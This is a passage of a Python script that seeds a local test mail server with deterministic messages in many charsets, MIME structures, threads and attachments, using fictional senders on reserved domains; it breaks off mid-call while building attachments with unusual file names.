#!/usr/bin/env python3
"""Fill the local test server with a deterministic set of test messages.

    seed.py [N] [--image-host URL] [--force] [--no-smtp] [--dump DIR]

N (default 1000) is the number of messages that end up in alice's account,
spread over INBOX, Sent, Drafts, Archive, Junk, Trash, Projects/2026 and
Projects/Überprüfung. Five of them arrive through SMTP (bob -> alice over
submission with STARTTLS and with implicit TLS, plus one unauthenticated
delivery on the local SMTP port), the rest are stored with IMAP APPEND.
Bob always gets the same small set of messages, independent of N.

Every message carries an `X-Vicemail-Seed: <category>/<name>` header, so tests
can find specific messages. The output depends only on N and the image host:
a fixed random seed, fixed dates and fixed Message-IDs.

The fixed corpus (always included) contains: a 60-message thread with
branches, one message per charset, multipart structures (alternative, mixed,
related with cid: images, signed, encrypted, digest, forwarded message/rfc822),
attachments with RFC 2231/2047 file names and hostile file names, HTML with
external images pointing to --image-host, hostile HTML, mailing-list and
auto-generated mails, two large messages and 26 deliberately broken mails.
"""

from __future__ import annotations

import argparse
import base64
import datetime as dt
import io
import quopri
import random
import re
import smtplib
import ssl
import struct
import sys
import time
import zipfile
import zlib
from dataclasses import dataclass, field
from pathlib import Path

sys.dont_write_bytecode = True  # keep testmail/ free of __pycache__
sys.path.insert(0, str(Path(__file__).resolve().parent))
from common import Imap, ImapError, load_env, mutf7_encode, quote, tls_context  # noqa: E402

RANDOM_SEED = 20261122
DEFAULT_COUNT = 1000
SMTP_TO_ALICE = 5  # messages alice receives through SMTP

# Folder names as seen by IMAP clients (UTF-8; encoded to modified UTF-7 on the wire).
INBOX, SENT, DRAFTS, ARCHIVE, JUNK, TRASH = "INBOX", "Sent", "Drafts", "Archive", "Junk", "Trash"
PROJECTS_PARENT = "Projects"
PROJECTS = "Projects/2026"
REVIEW = "Projects/Überprüfung"
EMPTY = "Projects/Empty"
CREATED_FOLDERS = [PROJECTS_PARENT, PROJECTS, REVIEW, EMPTY]

FILLER_FOLDERS = [  # (folder, weight)
    (INBOX, 66), (ARCHIVE, 12), (SENT, 10), (PROJECTS, 5), (REVIEW, 1),
    (DRAFTS, 2), (TRASH, 2), (JUNK, 2),
]

# ---------------------------------------------------------------------------
# Content pools (all domains are reserved: .example, .test, example.com/.net/.org)

PEOPLE = [
    ("Carol Clark", "carol@example.org", "en"),
    ("Dave Dawson", "dave@example.net", "en"),
    ("Erika Müller", "erika.mueller@firma.example", "de"),
    ("Jürgen Groß", "juergen.gross@firma.example", "de"),
    ("François Lefèvre", "f.lefevre@example.com", "fr"),
    ("Zoë Ångström", "zoe@uni.example", "en"),
    ("Łukasz Wiśniewski", "lukasz@example.net", "en"),
    ("Анна Иванова", "anna.ivanova@example.org", "ru"),
    ("田中 太郎", "tanaka@nihon.example", "ja"),
    ("王芳", "wang.fang@example.com", "en"),
    ("김민준", "minjun.kim@example.net", "en"),
    ("דוד כהן", "david.cohen@example.org", "en"),
    ("Maria Rossi", "maria.rossi@example.com", "en"),
    ("Peter O'Brien", "peter.obrien@example.org", "en"),
    ("Smith, John", "john.smith@example.com", "en"),
    ("Sabine Schäfer", "s.schaefer@behoerde.example", "de"),
    ("Thomas Weiß", "thomas@verein.example", "de"),
    ("Priya Sharma", "priya@example.net", "en"),
    ("", "noname@example.com", "en"),
    ("Hannah Becker", "hannah.becker@uni.example", "de"),
]
SERVICES = [  # automated senders
    ("Shop Example", "orders@shop.example"),
    ("CI Example", "notifications@ci.example"),
    ("Calendar", "calendar@cal.example"),
    ("Paketdienst", "versand@paket.example"),
    ("Vice Bank", "service@bank.example"),
]
LISTS = [  # (name, address, list-id)
    ("Example News", "news@news.example", "Example News <weekly.news.example>"),
    ("Rust Users", "rust-users@lists.example", "Rust users discussion <rust-users.lists.example>"),
    ("Vereinsinfo", "info@verein.example", "Mitglieder <mitglieder.verein.example>"),
]

EN_TOPICS = ["the Q3 roadmap", "the offsite", "the budget review", "the new office",
             "release 2.4", "the hiring plan", "customer onboarding", "the database migration",
             "API rate limits", "the security audit", "the website relaunch", "our backup strategy",
             "the conference talk", "travel expenses", "the support rotation"]
DE_TOPICS = ["Projekt Phönix", "die Jahresplanung", "das Angebot für Müller & Söhne",
             "den Umzug ins neue Büro", "die Datenschutzerklärung", "die Weihnachtsfeier",
             "das Budget 2027", "die Schulung am Freitag", "die Steuererklärung", "die Übergabe"]
EN_SUBJECTS = ["Meeting notes: {t}", "Question about {t}", "{T} – status update",
               "Feedback on {t}", "Reminder: {t} tomorrow", "Draft: {t}", "Thoughts on {t}",
               "Lunch on {day}?", "Photos from {place}", "Weekly report, week {n}",
               "Invoice {num} for {month}", "Quick question", "Re: {t}", "Fwd: {t}"]
DE_SUBJECTS = ["Frage zu {t}", "Protokoll: {t}", "Einladung: {t} am {day}", "Rechnung Nr. {num}",
               "Kurze Rückmeldung zu {t}", "Termin nächste Woche", "Änderungen an {t}",
               "AW: {t}", "WG: {t}", "Urlaubsvertretung im {month}"]
EN_SENTENCES = [
    "I had a look at the numbers and they mostly add up.",
    "Could you send me the latest version before Friday?",
    "The meeting has been moved to Thursday at 10:00.",
    "We still need a decision on the vendor.",
    "Thanks for the quick turnaround on this.",
    "I attached the notes from yesterday's call.",
    "Let me know if anything is unclear.",
    "The staging environment is back up again.",
    "I think we should keep the scope small for the first release.",
    "Please review the draft and leave comments directly in the document.",
    "The client asked whether we can deliver two weeks earlier.",
    "I'm out of office next Monday, so Dave will cover for me.",
    "Here is a summary of the open points.",
    "The test results look good, only two minor issues remain.",
    "Can we talk about this in our next one-on-one?",
    "I booked the room for the whole afternoon.",
    "Sorry for the late reply, it has been a busy week.",
    "The invoice is attached; payment is due within 30 days.",
    "We agreed to postpone the migration until after the holidays.",
    "Do you have a preference for the venue?",
    "The new logo looks great on the dark background.",
    "Our backup job failed twice last night, I am looking into it.",
    "I've updated the spreadsheet with the latest figures.",
    "Everyone seems to be fine with the proposed schedule.",
    "Remember to bring your laptop and charger.",
]
DE_SENTENCES = [
    "Ich habe mir die Zahlen angesehen, im Großen und Ganzen passt es.",
    "Kannst du mir bis Freitag die aktuelle Fassung schicken?",
    "Das Treffen wurde auf Donnerstag, 10 Uhr, verschoben.",
    "Wir brauchen noch eine Entscheidung zum Anbieter.",
    "Vielen Dank für die schnelle Rückmeldung!",
    "Im Anhang findest du das Protokoll von gestern.",
    "Melde dich gern, wenn etwas unklar ist.",
    "Die Testumgebung läuft wieder.",
    "Für die erste Version sollten wir den Umfang klein halten.",
    "Bitte prüfe den Entwurf und kommentiere direkt im Dokument.",
    "Der Kunde fragt, ob wir zwei Wochen früher liefern können.",
    "Nächsten Montag bin ich nicht im Büro, Jürgen vertritt mich.",
    "Hier eine kurze Übersicht über die offenen Punkte.",
    "Die Ergebnisse sehen gut aus, nur zwei Kleinigkeiten sind offen.",
    "Entschuldige die späte Antwort, die Woche war sehr voll.",
    "Die Rechnung liegt bei; zahlbar innerhalb von 30 Tagen.",
    "Wir haben die Umstellung auf die Zeit nach den Feiertagen verschoben.",
    "Grüße aus München und ein schönes Wochenende!",
    "Größere Änderungen besprechen wir am besten persönlich.",
    "Die Straße vor dem Büro ist ab Mittwoch gesperrt.",
]
OTHER_SENTENCES = {
    "fr": ["Merci beaucoup pour votre réponse rapide.", "La réunion est déplacée à jeudi.",
           "Ci-joint le compte rendu de la réunion d'hier.", "À bientôt, et bon week-end !"],
    "ru": ["Спасибо за быстрый ответ.", "Встреча перенесена на четверг.",
           "Во вложении протокол вчерашней встречи."],
    "ja": ["ご連絡ありがとうございます。", "会議は木曜日に変更になりました。",
           "昨日の議事録を添付します。", "よろしくお願いいたします。"],
}
PLACES = ["Lisbon", "the Alps", "Hamburg", "the team event", "Kyoto", "the conference"]
MONTHS_EN = ["January", "February", "March", "April", "May", "June", "July", "August",
             "September", "October", "November", "December"]
MONTHS_DE = ["Januar", "Februar", "März", "April", "Mai", "Juni", "Juli", "August",
             "September", "Oktober", "November", "Dezember"]
DAYS = ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday"]

# ---------------------------------------------------------------------------
# MIME building (manual, so broken structures are possible too)


class Part:
    """A MIME entity: header lines (already encoded) and a body."""

    def __init__(self, headers: list[bytes], body: bytes) -> None:
        self.headers = headers
        self.body = body

    def render(self) -> bytes:
        return b"".join(h + b"\n" for h in self.headers) + b"\n" + self.body


def is_ascii(text: str) -> bool:
    return all(ord(c) < 128 for c in text)


def encoded_words(text: str, charset: str = "utf-8", mode: str = "B") -> str:
    """RFC 2047 encoded words, split so that no word exceeds 75 characters."""
    prefix, suffix = f"=?{charset}?{mode}?", "?="
    words, chunk = [], ""

    def enc(s: str) -> str:
        data = s.encode(charset)
        if mode == "B":
            return base64.b64encode(data).decode()
        out = []
        for byte in data:
            ch = chr(byte)
            if ch == " ":
                out.append("_")
            elif ch.isalnum() and byte < 128:
                out.append(ch)
            else:
                out.append(f"={byte:02X}")
        return "".join(out)

    for ch in text:
        if len(prefix) + len(enc(chunk + ch)) + len(suffix) > 75 and chunk:
            words.append(prefix + enc(chunk) + suffix)
            chunk = ""
        chunk += ch
    if chunk:
        words.append(prefix + enc(chunk) + suffix)
    return " ".join(words)


def header_text(text: str, charset: str = "utf-8", mode: str = "B") -> str:
    return text if is_ascii(text) else encoded_words(text, charset, mode)


def address(name: str, email: str, charset: str = "utf-8") -> str:
    if not name:
        return email
    if not is_ascii(name):
        return f"{encoded_words(name, charset)} <{email}>"
    if re.search(r'[(),.:;<>@\[\]"\\]', name):
        return '"' + name.replace("\\", "\\\\").replace('"', '\\"') + f'" <{email}>'
    return f"{name} <{email}>"


def fold(name: str, value: str) -> bytes:
    """Fold a header at spaces so lines stay below 78 characters where possible."""
    line, lines = f"{name}: ", []
    for token in value.split(" "):
        if len(line) + len(token) + 1 > 78 and line.strip() and not line.endswith(": "):
            lines.append(line.rstrip())
            line = " " + token
        else:
            line = line + token if line.endswith((": ", " ")) else line + " " + token
    lines.append(line)
    return "\n".join(lines).encode("utf-8")


def b64_body(data: bytes) -> bytes:
    enc = base64.b64encode(data)
    return b"\n".join(enc[i:i + 76] for i in range(0, len(enc), 76)) + b"\n"


def qp_body(data: bytes) -> bytes:
    return quopri.encodestring(data.replace(b"\r\n", b"\n"))


def text_part(text: str, subtype: str = "plain", charset: str = "utf-8", cte: str | None = None,
              extra_params: str = "") -> Part:
    data = text.encode(charset)
    if cte is None:
        cte = "7bit" if max(data, default=0) < 128 else "quoted-printable"
    if cte == "base64":
        body = b64_body(data)
    elif cte == "quoted-printable":
        body = qp_body(data)
    else:
        body = data if data.endswith(b"\n") else data + b"\n"
    ctype = f"Content-Type: text/{subtype}; charset={charset}{extra_params}"
    return Part([ctype.encode(), f"Content-Transfer-Encoding: {cte}".encode()], body)


def filename_params(filename: str, style: str) -> tuple[str, str]:
    """Return (content-type param, disposition param) for a file name."""
    if is_ascii(filename) and style != "2231":
        return f'; name="{filename}"', f'; filename="{filename}"'
    if style == "2047":  # Outlook style: encoded word inside a quoted string
        word = encoded_words(filename)
        return f'; name="{word}"', f'; filename="{word}"'
    if style == "2231-continuation":
        from urllib.parse import quote as pct
        encoded = pct(filename, safe="")
        pieces = [encoded[i:i + 40] for i in range(0, len(encoded), 40)]
        disp = "".join(
            f";\n filename*{i}*={'UTF-8' + chr(39) * 2 if i == 0 else ''}{p}" for i, p in enumerate(pieces))
        return f'; name="{filename.encode("ascii", "replace").decode()}"', disp
    from urllib.parse import quote as pct
    return f"; name*=UTF-8''{pct(filename, safe='')}", f";\n filename*=UTF-8''{pct(filename, safe='')}"


def attachment(data: bytes, ctype: str, filename: str | None, *, style: str = "plain",
               inline: bool = False, cid: str | None = None) -> Part:
    name_param, disp_param = filename_params(filename, style) if filename else ("", "")
    headers = [f"Content-Type: {ctype}{name_param}".encode()]
    headers.append(b"Content-Transfer-Encoding: base64")
    disp = "inline" if inline else "attachment"
    headers.append(f"Content-Disposition: {disp}{disp_param}".encode())
    if cid:
        headers.append(f"Content-ID: <{cid}>".encode())
    return Part(headers, b64_body(data))


class Boundaries:
    def __init__(self, rng: random.Random) -> None:
        self.rng = rng
        self.counter = 0

    def next(self) -> str:
        self.counter += 1
        return f"=_vm{self.counter:06d}_{self.rng.getrandbits(48):012x}"


def multipart(subtype: str, parts: list[Part], boundary: str, params: str = "") -> Part:
    body = b"This is a multi-part message in MIME format.\n\n"
    for part in parts:
        body += f"--{boundary}\n".encode() + part.render() + b"\n"
    body += f"--{boundary}--\n".encode()
    return Part([f'Content-Type: multipart/{subtype}; boundary="{boundary}"{params}'.encode()], body)


def message(headers: list[tuple[str, str] | bytes], body: Part, *, crlf: bool = True) -> bytes:
    out = b""
    for item in headers:
        out += (item if isinstance(item, bytes) else fold(*item)) + b"\n"
    out += b"MIME-Version: 1.0\n" + body.render()
    if crlf:
        out = out.replace(b"\r\n", b"\n").replace(b"\n", b"\r\n")
    return out


# ---------------------------------------------------------------------------
# Binary attachment payloads (deterministic)


def png_image(rng: random.Random, width: int, height: int) -> bytes:
    def chunk(kind: bytes, data: bytes) -> bytes:
        return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data))

    color = bytes(rng.randrange(256) for _ in range(3))
    rows = b"".join(b"\x00" + (color if (y // 4) % 2 else bytes(255 - c for c in color)) * width
                    for y in range(height))
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress(rows)) + chunk(b"IEND", b""))


GIF_PIXEL = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==")


def pdf_document(rng: random.Random, title: str, padding: int) -> bytes:
    text = title.encode("latin-1", "replace")
    stream = b"BT /F1 18 Tf 72 720 Td (" + text + b") Tj ET"
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
        b"/Resources << /Font << /F1 5 0 R >> >> >>",
        b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"\nendstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    out = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
    offsets = []
    for i, obj in enumerate(objs, 1):
        offsets.append(len(out))
        out += f"{i} 0 obj\n".encode() + obj + b"\nendobj\n"
    out += b"% padding " + base64.b64encode(rng.randbytes(padding)) + b"\n"
    xref = len(out)
    out += f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n".encode()
    out += b"".join(f"{o:010d} 00000 n \n".encode() for o in offsets)
    out += f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    return out


def zip_archive(files: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in files.items():
            info = zipfile.ZipInfo(name, date_time=(2026, 1, 15, 12, 0, 0))
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, data)
    return buf.getvalue()


# ---------------------------------------------------------------------------


@dataclass
class Msg:
    account: str              # "alice" or "bob"
    folder: str
    date: dt.datetime         # used for INTERNALDATE
    raw: bytes
    key: str                  # value of X-Vicemail-Seed
    flags: list[str] = field(default_factory=list)


class Generator:
    def __init__(self, count: int, image_host: str, domain: str, alice: str, bob: str,
                 filler_folder: str | None = None) -> None:
        self.rng = random.Random(RANDOM_SEED)
        self.filler_folder = filler_folder
        self.count = count
        self.image_host = image_host if image_host.endswith("/") else image_host + "/"
        self.domain = domain
        self.alice = ("Alice Archer", alice)
        self.bob = ("Bob Baker", bob)
        self.bounds = Boundaries(self.rng)
        self.alice_msgs: list[Msg] = []
        self.bob_msgs: list[Msg] = []
        self.smtp_msgs: list[tuple[str, str, list[str], Msg]] = []  # (port kind, sender, rcpts, msg)

    # -- helpers -----------------------------------------------------------

    def msgid(self, key: str) -> str:
        return f"<{key.replace('/', '.')}@seed.{self.domain}>"

    def base_headers(self, key: str, date: dt.datetime | None, sender: tuple[str, str],
                     to: list[tuple[str, str]], subject: str, *, cc: list[tuple[str, str]] = (),
                     msgid: str | None = None, extra: list[tuple[str, str]] = ()) -> list[tuple[str, str]]:
        headers: list[tuple[str, str]] = []
        if date is not None:
            headers.append(("Date", fmt_date(date)))
        headers.append(("From", address(*sender)))
        headers.append(("To", ", ".join(address(*p) for p in to)))
        if cc:
            headers.append(("Cc", ", ".join(address(*p) for p in cc)))
        headers.append(("Subject", header_text(subject)))
        headers.append(("Message-ID", msgid or self.msgid(key)))
        headers.extend(extra)
        headers.append(("X-Vicemail-Seed", key))
        return headers

    def sentences(self, lang: str, n: int) -> list[str]:
        pool = {"en": EN_SENTENCES, "de": DE_SENTENCES}.get(lang) or OTHER_SENTENCES[lang]
        return [self.rng.choice(pool) for _ in range(n)]

    def body_text(self, lang: str, greeting_name: str, signer: str) -> str:
        first = greeting_name.split(" ")[0] if greeting_name else ""
        hello = {"en": f"Hi {first},", "de": f"Hallo {first},", "fr": f"Bonjour {first},",
                 "ru": f"Здравствуйте, {first}!", "ja": f"{greeting_name}様"}[lang]
        bye = {"en": "Best regards", "de": "Viele Grüße", "fr": "Cordialement",
               "ru": "С уважением", "ja": "よろしくお願いします"}[lang]
        paragraphs = [" ".join(self.sentences(lang, self.rng.randint(1, 4)))
                      for _ in range(self.rng.randint(1, 4))]
        return f"{hello}\n\n" + "\n\n".join(paragraphs) + f"\n\n{bye}\n{signer}\n"

    def html_from_text(self, text: str, title: str = "") -> str:
        paras = [p.replace("\n", "<br>\n") for p in text.strip().split("\n\n")]
        body = "\n".join(f"<p>{escape_html(p)}</p>" for p in paras)
        return (f"<!DOCTYPE html>\n<html><head><meta charset=\"utf-8\"><title>{escape_html(title)}</title>"
                f"</head>\n<body style=\"font-family: sans-serif\">\n{body}\n</body></html>\n")

    def subject_for(self, lang: str) -> str:
        rng = self.rng
        n = rng.randint(1000, 99999)
        if lang == "de":
            template = rng.choice(DE_SUBJECTS)
            topic = rng.choice(DE_TOPICS)
            return template.format(t=topic, T=topic[:1].upper() + topic[1:], day=rng.choice(DAYS),
                                   num=n, month=rng.choice(MONTHS_DE))
        template = rng.choice(EN_SUBJECTS)
        topic = rng.choice(EN_TOPICS)
        return template.format(t=topic, T=topic[:1].upper() + topic[1:], day=rng.choice(DAYS),
                               num=n, month=rng.choice(MONTHS_EN), place=rng.choice(PLACES),
                               n=rng.randint(1, 52))

    def add(self, account: str, folder: str, date: dt.datetime, raw: bytes, key: str,
            flags: list[str] | None = None) -> Msg:
        msg = Msg(account, folder, date, raw, key, list(flags or []))
        (self.alice_msgs if account == "alice" else self.bob_msgs).append(msg)
        return msg

    # -- corpus ------------------------------------------------------------

    def generate(self) -> None:
        self.long_thread()
        self.charsets()
        self.structures()
        self.html_mails()
        self.list_and_auto()
        self.broken()
        self.large()
        self.smtp_corpus()
        self.bob_corpus()
        fixed = len(self.alice_msgs) + SMTP_TO_ALICE
        if self.count < fixed:
            raise SystemExit(f"N must be at least {fixed} (size of the fixed corpus), got {self.count}")
        self.filler(self.count - fixed)

    def long_thread(self) -> None:
        """60 messages, branching replies, spread over Archive, INBOX and Sent."""
        rng = random.Random(RANDOM_SEED + 1)
        people = [self.alice, self.bob, PEOPLE[0][:2], PEOPLE[1][:2], PEOPLE[2][:2]]
        subject = "Planning the 2026 offsite"
        start = dt.datetime(2026, 3, 2, 9, 15, tzinfo=dt.timezone(dt.timedelta(hours=1)))
        entries: list[dict] = []
        for i in range(60):
            key = f"thread/offsite-{i:02d}"
            sender = people[0] if i % 4 == 1 else people[i % len(people)] if i else people[3]
            if i == 0:
                parent = None
            elif i in (7, 19, 33, 41):
                parent = entries[rng.randrange(0, i - 1)]  # branch off an earlier message
            else:
                parent = entries[i - 1]
            refs = (parent["refs"] + [parent["id"]]) if parent else []
            if i == 0:
                subj = subject
            elif sender == people[4]:
                subj = "AW: " + subject
            elif i == 30:
                subj = f"Re: {subject} (was: venue shortlist)"
            else:
                subj = "Re: " + subject
            date = start + dt.timedelta(hours=7 * i + rng.randint(0, 5), minutes=rng.randint(0, 59))
            msgid = self.msgid(key)
            entry = {"id": msgid, "refs": refs, "sender": sender, "date": date}
            entries.append(entry)
            to = [p for p in people[:3] if p != sender]
            extra: list[tuple[str, str]] = []
            if parent and i != 12:   # message 12: References only (no In-Reply-To)
                extra.append(("In-Reply-To", parent["id"]))
            if refs and i != 22:     # message 22: In-Reply-To only (Outlook style)
                shown = refs if i % 10 else [refs[0]] + refs[-10:]  # sometimes trimmed
                extra.append(("References", " ".join(dict.fromkeys(shown))))
            lang = "de" if sender == people[4] else "en"
            text = self.body_text(lang, to[0][0], sender[0])
            if parent:
                quoted = "\n".join("> " + line for line in f"Earlier message {i - 1}.".splitlines())
                text += f"\nOn {fmt_date(parent['date'])}, {parent['sender'][0]} wrote:\n{quoted}\n"
            headers = self.base_headers(key, date, sender, to, subj, msgid=msgid, extra=extra)
            raw = message(headers, text_part(text, cte="quoted-printable"))
            if sender == self.alice:
                folder, flags = SENT, ["\\Seen"]
            elif i < 15:
                folder, flags = ARCHIVE, ["\\Seen", "\\Answered"]
            else:
                folder, flags = INBOX, (["\\Seen"] if i < 55 else [])
            if i in (5, 44):
                flags.append("\\Flagged")
            if i == 50:
                flags.append("$label1")
            self.add("alice", folder, date, raw, key, flags)

    def charsets(self) -> None:
        base = dt.datetime(2026, 5, 4, 8, 0, tzinfo=dt.timezone.utc)
        samples = [
            ("iso-8859-1", "de", "Grüße aus Köln - Übersicht für März",
             "Sehr geehrte Frau Müller,\n\nanbei die Übersicht für März. Die Größe der Räume "
             "ist ausreichend, die Preise sind gestiegen.\n\nMit freundlichen Grüßen\nJürgen Groß\n",
             PEOPLE[3]),
            ("windows-1252", "de", "„Angebot“ – Preis 1.250 € (inkl. MwSt.)",
             "Hallo Alice,\n\nhier das „Angebot“ – der Preis liegt bei 1.250 € … inklusive "
             "Versand™.\n\nGrüße\nErika\n", PEOPLE[2]),
            ("iso-8859-15", "de", "Rechnung über 99 € - Œuvre",
             "Der Betrag von 99 € ist fällig. Œuvre, Šárka und Žofie lassen grüßen.\n", PEOPLE[15]),
            ("iso-8859-2", "en", "Zażółć gęślą jaźń",
             "Zażółć gęślą jaźń - Příliš žluťoučký kůň úpěl ďábelské ódy.\n", PEOPLE[6]),
            ("koi8-r", "ru", "Встреча в четверг",
             "Здравствуйте, Алиса!\n\nВстреча перенесена на четверг. Съешь же ещё этих мягких "
             "французских булок, да выпей чаю.\n\nС уважением,\nАнна\n", PEOPLE[7]),
            ("windows-1251", "ru", "Протокол совещания",
             "Добрый день!\n\nВо вложении протокол вчерашнего совещания.\n\nАнна Иванова\n", PEOPLE[7]),
            ("iso-2022-jp", "ja", "会議の議事録について",
             "アリス様\n\nお世話になっております。昨日の会議の議事録を送付いたします。\n"
             "ご確認のほど、よろしくお願いいたします。\n\n田中 太郎\n", PEOPLE[8]),
            ("shift_jis", "ja", "見積書の送付",
             "アリス様\n\n見積書を添付いたします。半角ｶﾀｶﾅも含みます。\n\n田中\n", PEOPLE[8]),
            ("euc-jp", "ja", "出張の予定",
             "来週の出張の予定をお知らせします。東京、大阪、京都を訪問します。\n", PEOPLE[8]),
            ("gb2312", "en", "关于下周的会议",
             "爱丽丝你好，\n\n下周的会议改到星期四上午十点。请准时参加。\n\n王芳\n", PEOPLE[9]),
            ("big5", "en", "關於下週的會議",
             "愛麗絲你好，\n\n下週的會議改到星期四上午十點。\n\n王芳\n", PEOPLE[9]),
            ("euc-kr", "en", "다음 주 회의 안내",
             "앨리스 님 안녕하세요,\n\n다음 주 회의는 목요일 오전 10시입니다.\n\n김민준\n", PEOPLE[10]),
            ("utf-8", "en", "Emoji test 🎉👩‍💻🇩🇪 and RTL: שלום עולם / مرحبا بالعالم",
             "Party 🎉, family 👨‍👩‍👧‍👦, flags 🇩🇪🇯🇵, skin tones 👍🏽.\n"
             "Hebrew: שלום עולם. Arabic: مرحبا بالعالم. Mixed: abc אבג 123.\n"
             "Combining: e\u0301 vs é, Zalgo: Z̤͔ͧ̑̓ä͖̭̈̇lͮ̒ͫǧ̗͚̚o̙̔ͮ̇͐̇\n", PEOPLE[11]),
        ]
        for i, (charset, lang, subject, text, person) in enumerate(samples):
            key = f"charset/{charset}"
            mode = "Q" if i % 2 else "B"
            sender = (person[0], person[1])
            headers = [
                ("Date", fmt_date(base + dt.timedelta(hours=5 * i))),
                ("From", address(*sender, charset=charset)),
                ("To", address(*self.alice)),
                ("Subject", encoded_words(subject, charset, mode) if not is_ascii(subject) else subject),
                ("Message-ID", self.msgid(key)),
                ("X-Vicemail-Seed", key),
            ]
            cte = {"iso-2022-jp": "7bit", "utf-8": "base64"}.get(charset, "8bit" if i % 3 == 0 else "quoted-printable")
            body = text_part(text, charset=charset, cte=cte)
            self.add("alice", INBOX, base + dt.timedelta(hours=5 * i), message(headers, body), key,
                     ["\\Seen"] if i % 2 else [])

        # UTF-16 text attachment and an inline part declared in UTF-16LE.
        key = "charset/utf-16"
        text = "UTF-16 text with BOM: Grüße, 你好, 🎉\n"
        part = Part([b"Content-Type: text/plain; charset=utf-16", b"Content-Transfer-Encoding: base64"],
                    b64_body(text.encode("utf-16")))
        att = attachment(text.encode("utf-16-le"), "text/plain; charset=utf-16le", "utf16le.txt")
        headers = self.base_headers(key, base + dt.timedelta(days=3), PEOPLE[5][:2], [self.alice],
                                    "UTF-16 encoded parts")
        self.add("alice", INBOX, base + dt.timedelta(days=3),
                 message(headers, multipart("mixed", [part, att], self.bounds.next())), key, ["\\Seen"])

        # RFC 6532: raw UTF-8 in headers (internationalised addresses).
        key = "charset/utf8-headers"
        date = base + dt.timedelta(days=3, hours=2)
        raw_headers = [
            ("Date", fmt_date(date)),
            ("From", "Jürgen Groß <jürgen@firma.example>"),
            ("To", address(*self.alice)),
            ("Subject", "Raw UTF-8 header (RFC 6532): Größenänderung ✓"),
            ("Message-ID", self.msgid(key)),
            ("X-Vicemail-Seed", key),
        ]
        self.add("alice", INBOX, date, message(raw_headers, text_part("Internationalised headers.\n")), key)

        # Encoded-word edge cases that are still valid.
        key = "charset/rfc2047-mix"
        date = base + dt.timedelta(days=3, hours=4)
        subject = ("=?utf-8?q?Caf=C3=A9?= =?iso-8859-1?q?_und_M=FCsli?= plain text "
                   "=?UTF-8?B?8J+Ruw==?= =?utf-8?q?=E2=82=AC?=")
        headers = [
            ("Date", fmt_date(date)),
            ("From", f"=?iso-8859-1?q?Fran=E7ois_Lef=E8vre?= <{PEOPLE[4][1]}>"),
            ("To", f"{address(*self.alice)}, =?utf-8?b?0JDQvdC90LA=?= <{PEOPLE[7][1]}>"),
            ("Subject", subject),
            ("Message-ID", self.msgid(key)),
            ("X-Vicemail-Seed", key),
        ]
        self.add("alice", INBOX, date, message(headers, text_part("Adjacent encoded words must be joined.\n")),
                 key, ["\\Seen"])

    def structures(self) -> None:
        rng = self.rng
        base = dt.datetime(2026, 6, 1, 10, 0, tzinfo=dt.timezone(dt.timedelta(hours=2)))
        sender = PEOPLE[0][:2]
        step = iter(range(100))

        def when() -> dt.datetime:
            return base + dt.timedelta(hours=6 * next(step))

        def add(key: str, subject: str, body: Part, folder: str = INBOX, flags=("\\Seen",),
                who=sender, to=None, extra=()) -> None:
            date = when()
            headers = self.base_headers(key, date, who, to or [self.alice], subject, extra=list(extra))
            self.add("alice", folder, date, message(headers, body), key, list(flags))

        text = self.body_text("en", "Alice", "Carol")
        add("mime/alternative", "multipart/alternative: text and HTML",
            multipart("alternative", [text_part(text), text_part(self.html_from_text(text), "html")],
                      self.bounds.next()))

        add("mime/html-only", "HTML only, no text part",
            text_part(self.html_from_text(text, "HTML only"), "html", cte="quoted-printable"))

        long_line = " ".join(self.sentences("en", 80))
        add("mime/flowed", "format=flowed and a very long line",
            text_part("This paragraph uses format=flowed soft \nline breaks that a client \nshould join.\n\n"
                      f"{long_line}\n", extra_params="; format=flowed; delsp=no"))

        pdf = pdf_document(rng, "Rechnung März 2026", 20000)
        png = png_image(rng, 64, 48)
        csv = "Datum;Betrag;Währung\n2026-03-01;1.250,00;EUR\n2026-03-15;99,95;EUR\n".encode("utf-8")
        ics = ("BEGIN:VCALENDAR\r\nVERSION:2.0\r\nPRODID:-//Vice Mail//seed//EN\r\nBEGIN:VEVENT\r\n"
               "UID:seed-event-1@vicemail.test\r\nDTSTAMP:20260601T100000Z\r\nDTSTART:20260610T090000Z\r\n"
               "DTEND:20260610T100000Z\r\nSUMMARY:Kick-off\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n").encode()
        zipped = zip_archive({"readme.txt": b"Zip test\n", "data/numbers.csv": csv, "Ärger.txt": "ä\n".encode()})
        add("mime/mixed-attachments", "multipart/mixed with PDF, PNG, CSV, ICS and ZIP",
            multipart("mixed", [
                text_part(text),
                attachment(pdf, "application/pdf", "Rechnung März 2026.pdf", style="2231"),
                attachment(png, "image/png", "chart.png"),
                attachment(csv, "text/csv; charset=utf-8", "Übersicht.csv", style="2047"),
                attachment(ics, "text/calendar; charset=utf-8", "kickoff.ics"),
                attachment(zipped, "application/zip", "archive.zip"),
            ], self.bounds.next()), flags=["\\Seen", "\\Flagged"])

        long_name = "Sehr langer Dateiname mit Umlauten äöü und Sonderzeichen – Protokoll der " \
                    "Mitgliederversammlung vom 12. März 2026 (endgültige Fassung).pdf"
        add("mime/filenames", "Attachment names: RFC 2231 continuation, RFC 2047, emoji, Japanese",
            multipart("mixed", [
                text_part("Several attachments with non-ASCII file names.\n"),
                attachment(pdf_document(rng, "Lang", 500), "application/pdf", long_name,
                           style="2231-continuation"),
